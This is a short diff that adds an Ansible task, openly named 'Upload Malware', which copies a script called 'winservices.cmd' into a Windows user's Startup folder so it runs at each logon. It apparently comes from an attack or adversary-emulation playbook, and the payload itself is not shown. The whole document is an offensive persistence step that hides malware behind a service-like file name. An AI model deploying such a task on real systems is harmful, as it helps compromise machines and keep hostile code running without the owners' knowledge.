@@ -1,0 +1,4 @@
+    - name: Upload Malware
+      win_copy:
+        src: 'files/winservices.cmd'
+        dest: C:\Users\Admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winservices.cmd
